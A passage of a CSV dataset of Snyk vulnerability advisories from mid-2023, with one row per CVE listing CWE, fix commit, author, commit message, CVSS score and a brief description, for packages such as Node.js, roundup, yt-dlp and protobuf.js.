Affected versions of this package are vulnerable to Insufficient Session Expiration such that in a multi-node Graylog cluster, after a user has explicitly logged out, a user session may still be used for API requests until it has reached its original expiry time. After a user has logged out, the UI shows the login screen again, which gives the user the impression that their session is not valid anymore. However, if the session becomes compromised later, it can still be used to perform API requests against the Graylog cluster. The time frame for this is limited to the configured session lifetime, starting from the time when the user logged out.",2023
CVE-2023-37260,CWE-209,Snyk,https://security.snyk.io/vuln/SNYK-PHP-LEAGUEOAUTH2SERVER-5759287,07/07/2023,07/07/2023,https://github.com/thephpleague/oauth2-server/commit/0143d52cea8c30cc1ccbb3e9ab9ec24566566931,Denial of Service (DoS),https://api.github.com/repos/thephpleague/oauth2-server/commits/0143d52cea8c30cc1ccbb3e9ab9ec24566566931,Andrew Millington,andrew@noexceptions.io,oauth2-server,0143d52cea8c30cc1ccbb3e9ab9ec24566566931,Remove potential key from exception message,PHP,8.2,high,Affected versions of this package are vulnerable to Denial of Service (DoS). Servers that pass their keys to the CryptKey constructor as a string instead of a file path will have that key included in a LogicException message if they did not provide a valid passphrase for the key where required.,2023
CVE-2023-36830,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-SQLFLUFF-5759286,07/07/2023,07/07/2023,https://github.com/sqlfluff/sqlfluff/commit/6cdc38d76bedab4801b035c04d3c2b3aea17de86,Arbitrary Code Execution,https://api.github.com/repos/sqlfluff/sqlfluff/commits/6cdc38d76bedab4801b035c04d3c2b3aea17de86,Alan Cruickshank,alanmcruickshank@gmail.com,sqlfluff,6cdc38d76bedab4801b035c04d3c2b3aea17de86,"Security option for library path (#4925)

Co-authored-by: Greg Finley <gregory.finley@gmail.com>",Unknown,6.3,medium,"sqlfluff is a The SQL Linter for Humans
Affected versions of this package are vulnerable to Arbitrary Code Execution. In environments where untrusted users have access to the config files (e.g. .sqlfluff), there is a potential security vulnerability where those users could use the library_path config value to allow arbitrary python code to be executed via macros. 
Note:
For many users who use SQLFluff in the context of an environment where all users already have fairly escalated privileges, this may not be an issue - however in larger user bases, or where SQLFluff is bundled into another tool where developers still wish to give users access to supply their on rule configuration, this may be an issue.",2023
CVE-2023-36829,CWE-942,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-SENTRY-5759281,07/07/2023,07/07/2023,https://github.com/getsentry/sentry/commit/ee44c6be35e5e464bc40637580f39867898acd8b,Permissive Cross-domain Policy with Untrusted Domains,https://api.github.com/repos/getsentry/sentry/commits/ee44c6be35e5e464bc40637580f39867898acd8b,Alexander Tarasov,alex.tarasov@sentry.io,sentry,ee44c6be35e5e464bc40637580f39867898acd8b,Fix GHSA-4xqm-4p72-87h6 (#52276),Python,6.8,medium,"Affected versions of this package are vulnerable to Permissive Cross-domain Policy with Untrusted Domains due to incorrectly returning the access-control-allow-credentials: true HTTP header if the Origin request header ends with the system.base-hostname option of Sentry installation. 
Note:
This only affects installations that have system.base-hostname option explicitly set, as it is empty by default. Impact is limited since recent versions of major browsers have cross-site cookie blocking enabled by default. However, this flaw could allow other multi-step attacks.",2023
CVE-2022-45802,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHESTREAMPARK-5759284,07/07/2023,07/07/2023,https://github.com/apache/incubator-streampark/commit/0c87c6d8cf39ef2c31c1dea1a7df23d76f5e1236,Directory Traversal,https://api.github.com/repos/apache/incubator-streampark/commits/0c87c6d8cf39ef2c31c1dea1a7df23d76f5e1236,benjobs,benjobs@apache.org,incubator-streampark,0c87c6d8cf39ef2c31c1dea1a7df23d76f5e1236,[Bug] upload jar file type check bug fixed (#2321),Scala,9.8,critical,"Affected versions of this package are vulnerable to Directory Traversal. Streampark allows any users to upload a jar as application, but there is no mandatory verification of the uploaded file type. This means users may upload some high-risk files, and may upload them to any directory.",2023
CVE-2023-35934,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-YOUTUBEDL-5759278,07/07/2023,07/07/2023,https://github.com/yt-dlp/yt-dlp/commit/1ceb657bdd254ad961489e5060f2ccc7d556b729,Information Exposure,https://api.github.com/repos/yt-dlp/yt-dlp/commits/1ceb657bdd254ad961489e5060f2ccc7d556b729,bashonly,bashonly@bashonly.com,yt-dlp,1ceb657bdd254ad961489e5060f2ccc7d556b729,"[fd/external] Scope cookies

- ffmpeg: Calculate cookies from cookiejar and pass with `-cookies` arg instead of `-headers`
- aria2c, curl, wget: Write cookiejar to file and use external FD built-in cookiejar support
- httpie: Calculate cookies from cookiejar instead of `http_headers`
- axel: Calculate cookies from cookiejar and disable http redirection if cookies are passed
    - May break redirects, but axel simply don't have proper cookie support

Ref: https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-v8mc-9377-rwjj

Authored by: bashonly, coletdjnz",Python,6.1,medium,"youtube_dl is a YouTube video downloader
Affected versions of this package are vulnerable to Information Exposure. During file downloads, yt-dlp or the external downloaders that yt-dlp employs may leak cookies on HTTP redirects to a different host, or leak them when the host for download fragments differs from their parent manifest's host.",2023
CVE-2023-35934,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-YOUTUBEDLC-5759277,07/07/2023,07/07/2023,https://github.com/yt-dlp/yt-dlp/commit/1ceb657bdd254ad961489e5060f2ccc7d556b729,Information Exposure,https://api.github.com/repos/yt-dlp/yt-dlp/commits/1ceb657bdd254ad961489e5060f2ccc7d556b729,bashonly,bashonly@bashonly.com,yt-dlp,1ceb657bdd254ad961489e5060f2ccc7d556b729,"[fd/external] Scope cookies

- ffmpeg: Calculate cookies from cookiejar and pass with `-cookies` arg instead of `-headers`
- aria2c, curl, wget: Write cookiejar to file and use external FD built-in cookiejar support
- httpie: Calculate cookies from cookiejar instead of `http_headers`
- axel: Calculate cookies from cookiejar and disable http redirection if cookies are passed
    - May break redirects, but axel simply don't have proper cookie support

Ref: https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-v8mc-9377-rwjj

Authored by: bashonly, coletdjnz",Python,6.1,medium,"youtube-dlc is a Media downloader supporting various sites such as youtube
Affected versions of this package are vulnerable to Information Exposure. During file downloads, yt-dlp or the external downloaders that yt-dlp employs may leak cookies on HTTP redirects to a different host, or leak them when the host for download fragments differs from their parent manifest's host.",2023
CVE-2023-30776,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-APACHESUPERSET-5759279,07/07/2023,07/07/2023,https://github.com/apache/superset/commit/ebaad10d6ce72fa9d939833720b44880d5139bb9,Information Exposure,https://api.github.com/repos/apache/superset/commits/ebaad10d6ce72fa9d939833720b44880d5139bb9,Hugh A. Miles II,hughmil3s@gmail.com,superset,ebaad10d6ce72fa9d939833720b44880d5139bb9,"feat(ssh-tunnelling):  Setup SSH Tunneling Commands for Database Connections  (#21912)

Co-authored-by: Antonio Rivero Martinez <38889534+Antonio-RiveroMartnez@users.noreply.github.com>
Co-authored-by: Elizabeth Thompson <eschutho@gmail.com>",Unknown,6.5,medium,"apache-superset is a modern, enterprise-ready business intelligence web application.
Affected versions of this package are vulnerable to Information Exposure. An authenticated user with specific data permissions could access database connections stored passwords by requesting a specific REST API.",2023
CVE-2022-45802,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHESTREAMPARK-5759283,07/07/2023,07/07/2023,https://github.com/apache/incubator-streampark/commit/0c87c6d8cf39ef2c31c1dea1a7df23d76f5e1236,Directory Traversal,https://api.github.com/repos/apache/incubator-streampark/commits/0c87c6d8cf39ef2c31c1dea1a7df23d76f5e1236,benjobs,benjobs@apache.org,incubator-streampark,0c87c6d8cf39ef2c31c1dea1a7df23d76f5e1236,[Bug] upload jar file type check bug fixed (#2321),Scala,9.8,critical,"Affected versions of this package are vulnerable to Directory Traversal. Streampark allows any users to upload a jar as application, but there is no mandatory verification of the uploaded file type. This means users may upload some high-risk files, and may upload them to any directory.",2023
CVE-2020-21146,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-FEEHICMS-5759275,07/07/2023,24/05/2022,https://github.com/liufee/cms/commit/e92f6877d96e53498101d0664174956e94223d6e,Cross-site Scripting (XSS),https://api.github.com/repos/liufee/cms/commits/e92f6877d96e53498101d0664174956e94223d6e,liufee,job@feehi.com,cms,e92f6877d96e53498101d0664174956e94223d6e,fix: username xss vulnerability,PHP,6.1,medium,"feehi/cms is a Feehi CMS project template.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization, via the username parameter.",2023
CVE-2022-46365,CWE-20,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHESTREAMPARK-5759280,07/07/2023,07/07/2023,https://github.com/apache/incubator-streampark/commit/4f39d7f422d7519a3febc2d15d31ed0126d54fbc,Improper Input Validation,https://api.github.com/repos/apache/incubator-streampark/commits/4f39d7f422d7519a3febc2d15d31ed0126d54fbc,benjobs,benjobs@apache.org,incubator-streampark,4f39d7f422d7519a3febc2d15d31ed0126d54fbc,[Bug] update password bug fixed (#2123),Java,9.1,critical,"Affected versions of this package are vulnerable to Improper Input Validation. When the user successfully logs in, to modify his profile, the username will be passed to the server-layer as a parameter, but not verified whether the user name is the currently logged user and whether the user is legal, This will allow malicious attackers to send any username to modify and reset the account.",2023
CVE-2023-35934,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-YTDLP-5759276,07/07/2023,07/07/2023,https://github.com/yt-dlp/yt-dlp/commit/1ceb657bdd254ad961489e5060f2ccc7d556b729,Information Exposure,https://api.github.com/repos/yt-dlp/yt-dlp/commits/1ceb657bdd254ad961489e5060f2ccc7d556b729,bashonly,bashonly@bashonly.com,yt-dlp,1ceb657bdd254ad961489e5060f2ccc7d556b729,"[fd/external] Scope cookies

- ffmpeg: Calculate cookies from cookiejar and pass with `-cookies` arg instead of `-headers`
- aria2c, curl, wget: Write cookiejar to file and use external FD built-in cookiejar support
- httpie: Calculate cookies from cookiejar instead of `http_headers`
- axel: Calculate cookies from cookiejar and disable http redirection if cookies are passed
    - May break redirects, but axel simply don't have proper cookie support

Ref: https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-v8mc-9377-rwjj

Authored by: bashonly, coletdjnz",Python,6.1,medium,"yt-dlp is an A youtube-dl fork with additional features and patches
Affected versions of this package are vulnerable to Information Exposure. During file downloads, yt-dlp or the external downloaders that yt-dlp employs may leak cookies on HTTP redirects to a different host, or leak them when the host for download fragments differs from their parent manifest's host.",2023
CVE-2023-30582,CWE-275,Snyk,https://security.snyk.io/vuln/SNYK-UPSTREAM-NODE-5756499,06/07/2023,20/06/2023,https://github.com/nodejs/node/commit/c39a43bff5bf9087d78a39a5ad21b26b4c67e8aa,Insecure Permissions,https://api.github.com/repos/nodejs/node/commits/c39a43bff5bf9087d78a39a5ad21b26b4c67e8aa,RafaelGSS,rafael.nunu@hotmail.com,node,c39a43bff5bf9087d78a39a5ad21b26b4c67e8aa,"permission: handle fs.watchFile

PR-URL: https://github.com/nodejs-private/node-private/pull/404
Refs: https://hackerone.com/bugs?subject=nodejs&report_id=1966499
Reviewed-By: Colin Ihrig <cjihrig@gmail.com>
Reviewed-By: Tobias Nießen <tniessen@tnie.de>
Reviewed-By: Matteo Collina <matteo.collina@gmail.com>
CVE-ID: CVE-2023-30582",C/C++,5.3,medium,"node is a JavaScript runtime built on Chrome's V8 JavaScript engine.
Affected versions of this package are vulnerable to Insecure Permissions affecting users of the experimental permission model when the --allow-fs-read flag is used with a non-* argument. This flaw arises from an inadequate permission model that fails to restrict file watching through the fs.watchFile API. As a result, malicious actors can monitor files that they do not have explicit read access to.
Note:
This vulnerability affects all users using the experimental permission model in Node.js 20.
At the time this CVE was issued, the permission model is an experimental feature of Node.js.",2023
CVE-2023-36665,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-5768912,06/07/2023,06/07/2023,https://github.com/protobufjs/protobuf.js/commit/e66379f451b0393c27d87b37fa7d271619e16b0d,Prototype Pollution,https://api.github.com/repos/protobufjs/protobuf.js/commits/e66379f451b0393c27d87b37fa7d271619e16b0d,Alexander Fenster,fenster@google.com,protobuf.js,e66379f451b0393c27d87b37fa7d271619e16b0d,"fix: do not let setProperty change the prototype (#1899)

* fix: do not let setProperty change the prototype

* test: add unit test",JavaScript,8.6,high,"Affected versions of this package are vulnerable to Prototype Pollution. A user-controlled protobuf message can be used by an attacker to pollute the prototype of Object.prototype by adding and overwriting its data and functions. Exploitation can involve: 

using the function parse to parse protobuf messages on the fly, 

loading .proto files by using load/loadSync functions, or 

providing untrusted input to the functions ReflectionObject.setParsedOption and util.setProperty


Note: This is a different issue from CVE-2022-25878",2023
CVE-2023-30587,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-UPSTREAM-NODE-5756500,06/07/2023,20/06/2023,https://github.com/nodejs/node/commit/3df13d5a79134330fd784365b7c0eb895fd5c3d3,Access Restriction Bypass,https://api.github.com/repos/nodejs/node/commits/3df13d5a79134330fd784365b7c0eb895fd5c3d3,RafaelGSS,rafael.nunu@hotmail.com,node,3df13d5a79134330fd784365b7c0eb895fd5c3d3,"src,permission: restrict inspector when pm enabled

PR-URL: https://github.com/nodejs-private/node-private/pull/410
Refs: https://hackerone.com/bugs?subject=nodejs&report_id=1962701
Reviewed-By: Matteo Collina <matteo.collina@gmail.com>
CVE-ID: CVE-2023-30587",Markdown,7.5,high,"node is a JavaScript runtime built on Chrome's V8 JavaScript engine.
Affected versions of this package are vulnerable to Access Restriction Bypass by allowing an attacker to bypass restrictions set by the --experimental-permission flag using the built-in inspector module (node:inspector). By exploiting the Worker class's ability to create an ""internal worker"" with the kIsInternal Symbol, attackers can modify the isInternal value when an inspector is attached within the Worker constructor before initializing a new WorkerImpl.
Note:
This vulnerability exclusively affects Node.js users employing the permission model mechanism in Node.js 20.
At the time this CVE was issued, the permission model is an experimental feature of Node.js.",2023
CVE-2023-36665,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-PROTOBUFJS-5756498,06/07/2023,06/07/2023,https://github.com/protobufjs/protobuf.js/commit/e66379f451b0393c27d87b37fa7d271619e16b0d,Prototype Pollution,https://api.github.com/repos/protobufjs/protobuf.js/commits/e66379f451b0393c27d87b37fa7d271619e16b0d,Alexander Fenster,fenster@google.com,protobuf.js,e66379f451b0393c27d87b37fa7d271619e16b0d,"fix: do not let setProperty change the prototype (#1899)

* fix: do not let setProperty change the prototype

* test: add unit test",JavaScript,8.6,high,"protobufjs is a protocol buffer for JavaScript (& TypeScript).
Affected versions of this package are vulnerable to Prototype Pollution. A user-controlled protobuf message can be used by an attacker to pollute the prototype of Object.prototype by adding and overwriting its data and functions. Exploitation can involve: 

using the function parse to parse protobuf messages on the fly, 

loading .proto files by using load/loadSync functions, or 

providing untrusted input to the functions ReflectionObject.setParsedOption and util.setProperty


Note: This is a different issue from CVE-2022-25878",2023
CVE-2023-30585,CWE-264,Snyk,https://security.snyk.io/vuln/SNYK-UPSTREAM-NODE-5756501,06/07/2023,20/06/2023,https://github.com/nodejs/node/commit/9c17e335f17a6df5cc6737b88477548ef4b1c37e,Privilege Escalation,https://api.github.com/repos/nodejs/node/commits/9c17e335f17a6df5cc6737b88477548ef4b1c37e,Tobias Nießen,tniessen@tnie.de,node,9c17e335f17a6df5cc6737b88477548ef4b1c37e,"msi: do not create AppData\Roaming\npm

This effectively reverts e431cae7e70069cd1631081f9dca09990b948feb due to
security concerns. The directory is being created with elevated
privileges but its path may depend on an unprivileged user's environment
variables. Creating a directory in certain sensitive locations can cause
Windows to become inoperable.

Creating AppData\Roaming\npm was an intentional addition in order to
resolve https://github.com/nodejs/node-v0.x-archive/issues/8141, which
appears to have been a common issue for users of npm. However, this was
implemented before 4cfe5eb9af9d0a46ab6bfe3a4a49c4b1e43513b0, which
changed the MSI installation scope to perMachine. There were concerns
about creating the npm directory in that PR, albeit not related to
security (see https://github.com/nodejs/node-v0.x-archive/pull/25640).

Refs: https://github.com/nodejs/node-v0.x-archive/issues/8141
Refs: https://github.com/nodejs/node-v0.x-archive/pull/8838
Refs: https://github.com/nodejs/node-v0.x-archive/pull/25640
PR-URL: https://github.com/nodejs-private/node-private/pull/408
Reviewed-By: Rafael Gonzaga <rafael.nunu@hotmail.com>
CVE-ID: CVE-2023-30585",Unknown,5.9,medium,"node is a JavaScript runtime built on Chrome's V8 JavaScript engine.
Affected versions of this package are vulnerable to Privilege Escalation via Malicious Registry Key manipulation during Node.js installer repair process. The issue arises when the path referenced by the %USERPROFILE% environment variable does not exist. In such cases, the ""msiexec.exe"" process attempts to create the specified path in an unsafe manner, potentially leading to the creation of arbitrary folders in arbitrary locations.
Note:
This vulnerability is specific to Windows users who install Node.js using the .msi installer. Users who opt for other installation methods are not affected by this particular issue.",2023
CVE-2023-3531,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-5759274,07/07/2023,07/07/2023,https://github.com/nilsteampassnet/teampass/commit/cb8ea5ccca61653895bb6881547e463baa50293d,Cross-site Scripting (XSS),https://api.github.com/repos/nilsteampassnet/teampass/commits/cb8ea5ccca61653895bb6881547e463baa50293d,nilsteampassnet,nils@teampass.net,teampass,cb8ea5ccca61653895bb6881547e463baa50293d,"3.0.10

Including new time related fields
Improving XSS protection",JavaScript,8.1,high,"nilsteampassnet/teampass is a password manager.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization in the pages/item component.",2023
,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-ACTINIACORE-5753314,05/07/2023,05/07/2023,https://github.com/actinia-org/actinia-core/commit/be5299efb6490c9a8b0804f185421c0828c6d126,Directory Traversal,https://api.github.com/repos/actinia-org/actinia-core/commits/be5299efb6490c9a8b0804f185421c0828c6d126,Marc Jansen,jansen@terrestris.de,actinia-core,be5299efb6490c9a8b0804f185421c0828c6d126,More secure path mangling (#281),Python,7.5,high,"actinia-core is an Actinia Core is an open source REST API for scalable, distributed, high performance processing of geographical data that uses mainly GRASS GIS for computational tasks
Affected versions of this package are vulnerable to Directory Traversal due to improper path sanitization in utils.py.",2023
,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-ROUNDUP-5753309,05/07/2023,05/07/2023,https://github.com/roundup-tracker/roundup/commit/b267853ddf7983c32bc0ada39a11eed0230903b6,Improper Access Control,https://api.github.com/repos/roundup-tracker/roundup/commits/b267853ddf7983c32bc0ada39a11eed0230903b6,Ralf Schlatterbeck,schlatterbeck@users.sourceforge.net,roundup,b267853ddf7983c32bc0ada39a11eed0230903b6,"- Add explicit ""Search"" permissions, see Security Fix below.

- Security Fix: Add a check for search-permissions: now we allow
  searching for properties only if the property is readable without a
  check method or if an explicit search permission (see above unter
  ""Features) is given for the property. This fixes cases where a user
  doesn't have access to a property but can deduce the content by
  crafting a clever search, group or sort query.
  see doc/upgrading.txt for how to fix your trackers!",Unknown,5.4,medium,"roundup is a simple-to-use and -install issue-tracking system with command-line, web and e-mail interfaces.
Affected versions of this package are vulnerable to Improper Access Control. A user who didn't have access to a property could deduce its content by crafting a clever search, group or sort query.",2023
,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-ARCHIVY-5753312,05/07/2023,05/07/2023,https://github.com/archivy/archivy/commit/dedc5a0b214acf2a25e0300304dabb46def4eef1,Directory Traversal,https://api.github.com/repos/archivy/archivy/commits/dedc5a0b214acf2a25e0300304dabb46def4eef1,Uzay-G,uzgirit@gmail.com,archivy,dedc5a0b214acf2a25e0300304dabb46def4eef1,fix path traversal issue,Python,7.5,high,"archivy is a Minimalist knowledge base focused on digital preservation and building your second brain.
Affected versions of this package are vulnerable to Directory Traversal via the create function in data.py.",2023
,CWE-453,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-ROUNDUP-5753311,05/07/2023,05/07/2023,https://github.com/roundup-tracker/roundup/commit/322fa0491230812f5fcd992beb50cde3c742a023,Insecure Defaults,https://api.github.com/repos/roundup-tracker/roundup/commits/322fa0491230812f5fcd992beb50cde3c742a023,Ralf Schlatterbeck,schlatterbeck@users.sourceforge.net,roundup,322fa0491230812f5fcd992beb50cde3c742a023,"Second patch from issue2550688 -- with some changes:

- password.py now has a second class JournalPassword used for journal
  storage. We have some backends that directly store serialized python
  objects. Also when reading from the journal some backends expected the
  string read to be usable as a parameter to a Password constructor.
  This now calls a JournalPassword constructor in all these cases.
  The new JournalPassword just keeps the scheme and has an empty
  password.
- some factoring, move redundant implementation of ""history"" from
  rdbms_common and back_anydbm to hyperdb.",Unknown,6.5,medium,"roundup is a simple-to-use and -install issue-tracking system with command-line, web and e-mail interfaces.
Affected versions of this package are vulnerable to Insecure Defaults due to unsafe password handling.",2023
,CWE-264,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-ROUNDUP-5753308,05/07/2023,05/07/2023,https://github.com/roundup-tracker/roundup/commit/30a43e13e15d43f2adfa6888d67cd08696fdfeb3,Privilege Escalation,https://api.github.com/repos/roundup-tracker/roundup/commits/30a43e13e15d43f2adfa6888d67cd08696fdfeb3,Richard Jones,richard@users.sourceforge.net,roundup,30a43e13e15d43f2adfa6888d67cd08696fdfeb3,"Fix security hole allowing user permission escalation

(thanks Ralf Schlatterbeck)

also update docs and prepare for a release",Unknown,8.3,high,"roundup is a simple-to-use and -install issue-tracking system with command-line, web and e-mail interfaces.
Affected versions of this package are vulnerable to Privilege Escalation via the own_record function.",2023
,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-ROUNDUP-5753307,05/07/2023,05/07/2023,https://github.com/roundup-tracker/roundup/commit/fd2d2d9fb6123610e8e7086480e2667fe32dfc8d,Cross-site Scripting (XSS),https://api.github.com/repos/roundup-tracker/roundup/commits/fd2d2d9fb6123610e8e7086480e2667fe32dfc8d,Ralf Schlatterbeck,rsc@runtux.com,roundup,fd2d2d9fb6123610e8e7086480e2667fe32dfc8d,"Fix XSS in issue2550817

Note that the code that triggers that particular bug is no longer in
roundup core. But the change to the templates we suggest is a *lot*
safer as it always escapes the error and ok messages now.

If you are upgrading: you *MUST* read doc/upgrading.txt and do the
necessary changes to your templates, the escaping now happens in the
template and not in the roundup code. So if you don't make the necessary
changes *you are vulnerable*.",Unknown,6.1,medium,"roundup is a simple-to-use and -install issue-tracking system with command-line, web and e-mail interfaces.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper input sanitization.",2023
,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-ROUNDUP-5753310,05/07/2023,05/07/2023,https://github.com/roundup-tracker/roundup/commit/52c63c89e34bb377f86b5efe51891491209ceb75,Improper Access Control,https://api.github.com/repos/roundup-tracker/roundup/commits/52c63c89e34bb377f86b5efe51891491209ceb75,Ralf Schlatterbeck,schlatterbeck@users.sourceforge.net,roundup,52c63c89e34bb377f86b5efe51891491209ceb75,"Fix security-problem: If user hasn't permission on a message...

...(notably files and content properties) and is on the nosy list, the
content was sent via email. We now check that user has permission on
the message content and files properties. Also add a regression test
for this.",Unknown,5.4,medium,"roundup is a simple-to-use and -install issue-tracking system with command-line, web and e-mail interfaces.
Affected versions of this package are vulnerable to Improper Access Control. If the user hasn't permission on a message (notably files and content properties) and is on the nosy list, the content is sent via email.",2023
,CWE-208,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-ROUNDUP-5753306,05/07/2023,05/07/2023,https://github.com/roundup-tracker/roundup/commit/7c8deb493be61f66b65b0ac0e6edba2627fbd017,Timing Attack,https://api.github.com/repos/roundup-tracker/roundup/commits/7c8deb493be61f66b65b0ac0e6edba2627fbd017,John Rouillard,rouilj@ieee.org,roundup,7c8deb493be61f66b65b0ac0e6edba2627fbd017,"Call verifyPassword even if user does not exist.

Address timing attack caused by not doing the password check if the
user doesn't exist. Can expose valid usernames. Really only useful for
a tracker that doesn't allow anonymous access to issues. Issues
usually show usernames as part of the message display.",Unknown,5.3,medium,"roundup is a simple-to-use and -install issue-tracking system with command-line, web and e-mail interfaces.
Affected versions of this package are vulnerable to Timing Attack via the verifyLogin function, because it doesn't run a password check when the user doesn't exist, which might expose valid usernames",2023
,CWE-453,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-ROUNDUP-5753305,05/07/2023,05/07/2023,https://github.com/roundup-tracker/roundup/commit/27ef29f1a64e89ebd4c5a99838a575ad3d44f993,Insecure Defaults,https://api.github.com/repos/roundup-tracker/roundup/commits/27ef29f1a64e89ebd4c5a99838a575ad3d44f993,Richard Jones,richard@users.sourceforge.net,roundup,27ef29f1a64e89ebd4c5a99838a575ad3d44f993,"Plug a number of security holes:

- EditCSV and ExportCSV altered to include permission checks
- HTTP POST required on actions which alter data
- HTML file uploads served as application/octet-stream
- New item action reject creation of new users
- Item retirement was not being controlled

Additionally include documentation of the changes and modify affected tests.",Unknown,5.4,medium,"roundup is a simple-to-use and -install issue-tracking system with command-line, web and e-mail interfaces.
Affected versions of this package are vulnerable to Insecure Defaults when it is serving uploaded HTML files content as HTML by default.",2023
,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-ROUNDUP-5753304,05/07/2023,05/07/2023,https://github.com/roundup-tracker/roundup/commit/5220f36fec484801c8fe2a206973da87aecf59d4,Improper Access Control,https://api.github.com/repos/roundup-tracker/roundup/commits/5220f36fec484801c8fe2a206973da87aecf59d4,John Rouillard,rouilj@ieee.org,roundup,5220f36fec484801c8fe2a206973da87aecf59d4,"improve REST interface security

When using REST, we reflect the client's origin. If the wildcard '*'
is used in allowed_api_origins all origins are allowed. When this is
done, it also added an 'Access-Control-Allow-Credentials: true'
header.

This Credentials header should not be added if the site is matched
only by '*'. This header should be provided only for explicit origins
(e.g. https://example.org) not for the wildcard.

This is now fixed for CORS preflight OPTIONS request as well as normal
GET, PUT, DELETE, POST, PATCH and OPTIONS requests.

A missing Access-Control-Allow-Credentials will prevent the tracker
from being accessed using credentials. This prevents an unauthorized
third party web site from using a user's credentials to access
information in the tracker that is not publicly available.

Added test for this specific case.

In addition, allowed_api_origins can include explicit origins in
addition to '*'. '*' must be first in the list.

Also adapted numerous tests to work with these changes.

Doc updates.",Unknown,6.5,medium,"roundup is a simple-to-use and -install issue-tracking system with command-line, web and e-mail interfaces.
Affected versions of this package are vulnerable to Improper Access Control due to the usage of the 'Access-Control-Allow-Credentials' header when using REST. Exploiting this vulnerability allows unauthorized third-party websites to use a user's credentials to access information in the tracker that is not publicly available.",2023
,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-WHATSAPPCHATEXPORTER-5753303,05/07/2023,05/07/2023,https://github.com/KnugiHK/WhatsApp-Chat-Exporter/commit/032af6cdcf3377e2736badaaaee36fdc91673be5,Cross-site Scripting (XSS),https://api.github.com/repos/KnugiHK/WhatsApp-Chat-Exporter/commits/032af6cdcf3377e2736badaaaee36fdc91673be5,KnugiHK,24708955+KnugiHK@users.noreply.github.com,WhatsApp-Chat-Exporter,032af6cdcf3377e2736badaaaee36fdc91673be5,Refactor,Python,6.1,medium,"whatsapp-chat-exporter is an A Whatsapp database parser that will give you the history of your Whatsapp conversations in HTML and JSON. Android, iOS, iPadOS, Crypt12, Crypt14, Crypt15 supported.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user input sanitization.",2023
,CWE-1333,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-YTDLP-5753302,05/07/2023,05/07/2023,https://github.com/yt-dlp/yt-dlp/commit/8aa0bd5d10627ece3c1815c01d02fb8bf22847a7,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/yt-dlp/yt-dlp/commits/8aa0bd5d10627ece3c1815c01d02fb8bf22847a7,bashonly,bashonly@bashonly.com,yt-dlp,8aa0bd5d10627ece3c1815c01d02fb8bf22847a7,"[extractor/generic] Avoid catastrophic backtracking in KVS regex

Authored by: bashonly",Python,5.3,medium,"yt-dlp is an A youtube-dl fork with additional features and patches
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of insecure regular expression generic.py",2023
CVE-2023-35142,CWE-295,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMCHECKMARXJENKINS-5753028,04/07/2023,14/06/2023,https://github.com/jenkinsci/checkmarx-plugin/commit/df458db3152b0950b68c0c1bceb3f6a1d870ead5,Improper Certificate Validation,https://api.github.com/repos/jenkinsci/checkmarx-plugin/commits/df458db3152b0950b68c0c1bceb3f6a1d870ead5,Khant1000,131154593+Khant1000@users.noreply.github.com,checkmarx-plugin,df458db3152b0950b68c0c1bceb3f6a1d870ead5,"Merge pull request #138 from jenkinsci/June-integration-2023

Release 2023.2.6 changes",Config files,5.9,medium,"com.checkmarx.jenkins:checkmarx is an automatic scanning plugin for Jenkins
Affected versions of this package are vulnerable to Improper Certificate Validation of SSL/TLS certificates, which are not validated by default.",2023
CVE-2020-22597,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-JERRYSCRIPTPROJECTJERRYSCRIPT-5753029,04/07/2023,04/07/2023,https://github.com/jerryscript-project/jerryscript/commit/c237ba6097815a66dbcd90a58201f38ce72986ab,Arbitrary Code Execution,https://api.github.com/repos/jerryscript-project/jerryscript/commits/c237ba6097815a66dbcd90a58201f38ce72986ab,Péter Gál,pgal.u-szeged@partner.samsung.com,jerryscript,c237ba6097815a66dbcd90a58201f38ce72986ab,"Fix Array.slice when using fast arrays (#3649)

When a fast array was used during the Array.slice call and
the input array's properties were removed the property
list was used incorrectly.

Fixes: #3637

JerryScript-DCO-1.0-Signed-off-by: Peter Gal pgal.u-szeged@partner.samsung.com",C/C++,9.8,critical,Affected versions of this package are vulnerable to Arbitrary Code Execution via the ecma_builtin_array_prototype_object_slice() function in ecma-builtin-array-prototype.c.,2023
